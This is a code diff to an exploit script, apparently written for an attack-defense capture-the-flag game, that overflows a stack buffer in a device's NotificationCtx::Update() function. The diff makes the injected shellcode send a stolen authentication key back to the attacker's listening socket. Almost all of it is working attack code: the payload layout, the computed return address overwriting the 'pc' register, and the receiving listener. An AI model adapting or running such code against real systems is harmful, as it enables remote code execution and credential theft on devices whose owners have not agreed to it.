@@ -4,12 +4,17 @@ from sys import argv, stderr
 import os
 import requests
 import struct
+import socket
 
 SERVER_ADDR = "10.60.3.2:8000"
 # value of 'sp' register at the very beginning of NotificationCtx::Update(),
 # before 'push {r4, r5, r6, r7, pc}' instruction,
 # ie start address of stack frame of NotificationCtx::Update()
 STACK_FRAME_START = 0x2000DCF8
+
+if len(argv) != 3:
+    print("usage: ./sploit.py <this host ip address> <port>")
+    exit(1)
 
 url = 'http://%s/auth' % (SERVER_ADDR)
 r = requests.get(url)
@@ -26,9 +31,9 @@ message = "Hi! "
 # its address is STACK_FRAME_START - 280, ie end of stack frame.
 # So below we build notification like this:
 #
-# |    4    | 'Evil' |   268   | 'Hi! ' |    0   | shell code | padding | return address |
-#   4 bytes   4bytes   4 bytes   4bytes   4 bytes    N bytes    M bytes      4 bytes
-# | <--                              280 bytes                                       --> |
+# |    4    | 'Evil' |   268   | 'Hi! ' |    0   | shell code | padding | ip address |  port   |    0    | return address |
+#   4 bytes   4bytes   4 bytes   4bytes   4 bytes    N bytes    M bytes     4 bytes    2 bytes   2 bytes       4 bytes
+# | <--                              280 bytes                                                                        --> |
 desiredLen = 280
 
 # build notification
@@ -50,14 +55,37 @@ shell = open("shell.bin", 'rb').read()
 notification += shell
 
 # padding
-notification += b'\x00' * (desiredLen - len(notification) - 4)
-# last 4 bytes of our notifcation - address of shell code, this address
+notification += b'\x00' * (desiredLen - len(notification) - 12)
+
+# store ip address and port
+ip = argv[1]
+port = int(argv[2])
+notification += socket.inet_aton(argv[1])
+notification += struct.pack('H', port)
+notification += struct.pack('H', 0)
+
+# last 4 bytes of our notification - address of shell code, this address
 # will be written to 'pc' register during 'pop {r4, r5, r6, r7, pc}' instruction
 # at the end of NotificationCtx::Update()
-shell_addr = STACK_FRAME_START - (desiredLen - shell_offset) + 1
+shell_addr = STACK_FRAME_START - desiredLen + shell_offset + 1
 notification += struct.pack('I', shell_addr)
 if len(notification) != desiredLen:
     print("Wrong length")
     exit(1)
 
+# open tcp socket, it will receive stolen by shell auth key from
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.bind(("", port))
+sock.listen(1)
+
+# send notification
 requests.post(url=url, data=notification, headers={'Content-Type': 'application/octet-stream'})
+
+# receive auth key from shell
+client_sock, addr = sock.accept()
+authKeyRaw = client_sock.recv(4)
+authKey = struct.unpack('I', authKeyRaw)[0]
+print(hex(authKey))
+client_sock.close()
+sock.close()
